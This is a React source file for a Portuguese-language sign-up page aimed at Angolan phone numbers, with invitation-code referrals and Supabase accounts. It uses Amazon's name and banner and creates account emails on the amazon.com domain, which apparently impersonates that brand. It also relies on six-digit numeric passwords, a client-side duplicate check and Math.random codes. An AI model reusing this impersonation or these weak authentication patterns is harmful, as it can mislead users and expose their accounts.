
import React, { useState } from 'react';
import { supabase } from '../supabase';
import { useLoading } from '../contexts/LoadingContext';
import SpokeSpinner from '../components/SpokeSpinner';


interface Props {
  onNavigate: (page: any) => void;
  onOpenSupport?: () => void;
  showToast?: (message: string, type: 'success' | 'error' | 'info' | 'warning') => void;
}

const Register: React.FC<Props> = ({ onNavigate, onOpenSupport, showToast }) => {
  const [showPassword, setShowPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [invitationCode, setInvitationCode] = useState('');
  const [agreedToTerms, setAgreedToTerms] = useState(false);
  const { withLoading } = useLoading();
  const [loading, setLoading] = useState(false);
  const [isValidatingRef, setIsValidatingRef] = useState(false);

  const [refStatus, setRefStatus] = useState<{ valid: boolean | null; message: string }>({ valid: null, message: '' });
  const [isRefLocked, setIsRefLocked] = useState(false);

  // Extração e validação automática do código de convite
  React.useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const ref = params.get('ref');

    if (ref) {
      setInvitationCode(ref);
      validateRefCode(ref);
    }
  }, []);

  const validateRefCode = async (code: string) => {
    if (!code) {
      setRefStatus({ valid: null, message: '' });
      setIsRefLocked(false);
      return;
    }

    setIsValidatingRef(true);
    try {
      const { data, error } = await supabase
        .from('profiles')
        .select('ref_code')
        .eq('ref_code', code)
        .single();

      if (error || !data) {
        setRefStatus({ valid: false, message: 'Código de convite não encontrado' });
        setIsRefLocked(false);
      } else {
        setRefStatus({ valid: true, message: 'Por favor prenche as informções' });
        setIsRefLocked(true);
      }
    } catch (err) {
      setRefStatus({ valid: false, message: 'Erro ao validar código ❌' });
    } finally {
      setIsValidatingRef(false);
    }
  };

  const handleRegister = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!agreedToTerms) {
      showToast?.("Você deve concordar com os Termos de Serviço.", "warning");
      return;
    }
    if (password.length !== 6) {
      showToast?.("Por favor digie (6 digítos)", "error");
      return;
    }
    if (phoneNumber.length < 9) {
      showToast?.("Por favor digie (9 digítos", "error");
      return;
    }

    if (invitationCode && refStatus.valid === false) {
      showToast?.("O código de convite inserido é inválido.", "error");
      return;
    }

    try {
      await withLoading(async () => {
        const { data: existingPhone } = await supabase
          .from('profiles')
          .select('id')
          .eq('phone', phoneNumber)
          .single();

        if (existingPhone) {
          throw new Error("Esta conta já existe");
        }

        const email = `${phoneNumber.replace(/\s/g, '')}@amazon.com`;
        const myUniqueCode = Math.random().toString(36).substring(2, 8).toUpperCase();

        const { data, error } = await supabase.auth.signUp({
          email,
          password,
          options: {
            data: {
              ref_code: myUniqueCode,
              phone: phoneNumber,
              referred_by: (invitationCode && refStatus.valid) ? invitationCode : null
            }
          }
        });

        if (error) {
          throw error;
        } else if (data.user) {
          if (invitationCode && refStatus.valid) {
            await supabase.from('invites').insert({
              ref_code: invitationCode,
              new_profile_id: data.user.id
            });
          }
        }
      }, "Registro sucedido!");

      onNavigate('login');
    } catch (error) {
      // feedback já tratado pelo withLoading
    }
  };

  return (
    <div className="bg-background-dark font-display text-black antialiased min-h-screen">
      <div className="relative flex min-h-screen w-full flex-col overflow-x-hidden max-w-md mx-auto">


        <main className="flex-1 px-0 pb-8">
          {/* Top Banner Image - Mostrando a imagem completa */}
          <div className="w-full overflow-hidden mb-6 relative">
            <img
              src="/banner_register.png"
              alt="Amazon Banner"
              className="w-full h-auto block object-contain"
            />
            <div className="absolute inset-0 bg-gradient-to-t from-background-dark via-background-dark/20 to-transparent"></div>
          </div>

          <div className="px-5">
            {/* Title & Subtitle */}
            <div className="mb-8 pt-2">
              <h1 className="text-[32px] font-bold leading-tight tracking-tight mb-2">Crie sua conta</h1>
              <p className="text-text-secondary text-base font-normal">Junte-se ao futuro dos serviços bancários e compras.</p>
            </div>

            <form className="flex flex-col gap-5" onSubmit={handleRegister}>
              {/* Phone Number Field */}
              <div className="flex flex-col gap-2">
                <label className="text-sm font-bold text-text-secondary uppercase tracking-wider">Número de Telefone</label>
                <div className="relative">
                  <div className="absolute inset-y-0 left-0 flex items-center pl-4 pointer-events-none">
                    <span className="text-xl mr-2">🇦🇴</span>
                    <span className="text-base font-medium text-text-primary">+244</span>
                    <div className="ml-3 h-6 w-px bg-amazon-border"></div>
                  </div>
                  <input
                    className="flex w-full rounded-lg border border-amazon-border bg-surface-dark pl-[7.5rem] pr-4 h-14 text-base focus:border-primary focus:ring-1 focus:ring-primary focus:outline-none transition-all placeholder:text-text-secondary/30"
                    placeholder="9XX XXX XXX"
                    type="tel"
                    value={phoneNumber}
                    onChange={(e) => setPhoneNumber(e.target.value)}
                    required
                  />
                </div>
              </div>

              {/* Password Field */}
              <div className="flex flex-col gap-2">
                <label className="text-sm font-bold text-text-secondary uppercase tracking-wider">Senha</label>
                <div className="relative">
                  <input
                    className="flex w-full rounded-lg border border-amazon-border bg-surface-dark pl-4 pr-12 h-14 text-base focus:border-primary focus:ring-1 focus:ring-primary focus:outline-none transition-all placeholder:text-text-secondary/30"
                    placeholder="6 dígitos numéricos"
                    type={showPassword ? "text" : "password"}
                    maxLength={6}
                    inputMode="numeric"
                    value={password}
                    onChange={(e) => {
                      const val = e.target.value.replace(/\D/g, '').slice(0, 6);
                      setPassword(val);
                    }}
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-0 top-0 h-full w-12 flex items-center justify-center text-gray-500 hover:text-primary transition-colors"
                  >
                    <span className="material-symbols-outlined text-xl">
                      {showPassword ? 'visibility' : 'visibility_off'}
                    </span>
                  </button>
                </div>

              </div>

              {/* Confirm Password Field */}
              <div className="flex flex-col gap-2">
                <label className="text-sm font-medium leading-none text-gray-700">Confirmar Senha</label>
                <div className="relative">
                  <input
                    className="flex w-full rounded-lg border border-border-dark bg-surface-dark px-4 h-14 text-base focus:border-primary focus:ring-1 focus:ring-primary focus:outline-none transition-all placeholder:text-[text-gray-400]"
                    placeholder="Repita a senha"
                    type={showConfirmPassword ? "text" : "password"}
                    maxLength={6}
                    inputMode="numeric"
                    value={confirmPassword}
                    onChange={(e) => {
                      const val = e.target.value.replace(/\D/g, '').slice(0, 6);
                      setConfirmPassword(val);
                    }}
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowConfirmPassword(!showConfirmPassword)}
                    className="absolute right-0 top-0 h-full w-12 flex items-center justify-center text-gray-500 hover:text-primary transition-colors"
                  >
                    <span className="material-symbols-outlined text-xl">
                      {showConfirmPassword ? 'visibility' : 'visibility_off'}
                    </span>
                  </button>
                </div>
              </div>

              {/* Invitation Code Field */}
              <div className="flex flex-col gap-2">
                <div className="flex items-center justify-between">
                  <label className="text-sm font-bold text-text-secondary uppercase tracking-wider">Código de Convite <span className="text-text-secondary/60 font-normal normal-case">(Opcional)</span></label>
                  <div className="flex items-center gap-2">
                    {isValidatingRef && <SpokeSpinner size="w-4 h-4" />}
                    <span onClick={() => onOpenSupport?.()} className="material-symbols-outlined text-text-secondary text-sm cursor-pointer" title="Clique para suporte">help</span>
                  </div>
                </div>
                <div className="relative">
                  <input
                    className={`flex w-full rounded-lg border border-amazon-border bg-surface-dark px-4 h-14 text-base focus:border-primary focus:ring-1 focus:ring-primary focus:outline-none transition-all placeholder:text-text-secondary/30 ${isRefLocked ? 'opacity-70 cursor-not-allowed bg-background-dark' : ''}`}
                    placeholder="Insira o código"
                    type="text"
                    value={invitationCode}
                    readOnly={isRefLocked}
                    onChange={(e) => {
                      const val = e.target.value.toUpperCase();
                      setInvitationCode(val);
                      if (val.length >= 3) validateRefCode(val);
                      else setRefStatus({ valid: null, message: '' });
                    }}
                  />
                  {refStatus.message && (
                    <p className={`text-[10px] font-bold mt-1 ml-1 ${refStatus.valid ? 'text-success-text' : 'text-error-text'}`}>
                      {refStatus.message}
                    </p>
                  )}
                </div>
              </div>

              {/* Terms Checkbox */}
              <div className="flex items-start gap-3 mt-2">
                <div className="flex h-6 items-center">
                  <input
                    className="h-5 w-5 rounded border-amazon-border bg-surface-dark text-primary focus:ring-offset-0 focus:ring-primary transition duration-150 ease-in-out cursor-pointer"
                    id="terms"
                    name="terms"
                    type="checkbox"
                    checked={agreedToTerms}
                    onChange={(e) => setAgreedToTerms(e.target.checked)}
                  />
                </div>
                <div className="text-sm leading-6">
                  <label className="font-bold text-text-secondary" htmlFor="terms">
                    Eu concordo com os <a className="text-primary hover:underline underline-offset-2" href="#">Termos de Serviço</a> e a <a className="text-primary hover:underline underline-offset-2" href="#">Política de Privacidade</a>.
                  </label>
                </div>
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                disabled={loading}
                className={`mt-4 flex w-full items-center justify-center rounded-lg bg-primary py-4 text-base font-bold text-black shadow-lg shadow-primary/10 hover:bg-yellow-400 active:scale-[0.98] transition-all cursor-pointer ${loading ? 'opacity-50 cursor-not-allowed' : ''}`}
              >
                {loading ? 'Criando Conta...' : 'Criar Conta'}
              </button>

              {/* Footer Link */}
              <p className="text-center text-sm font-medium text-text-secondary mt-2">
                Já tem uma conta? <button type="button" onClick={() => onNavigate('login')} className="text-primary hover:text-primary-hover ml-1 font-bold">Entrar</button>
              </p>
            </form>
          </div>
        </main>
      </div>
    </div>
  );
};

export default Register;
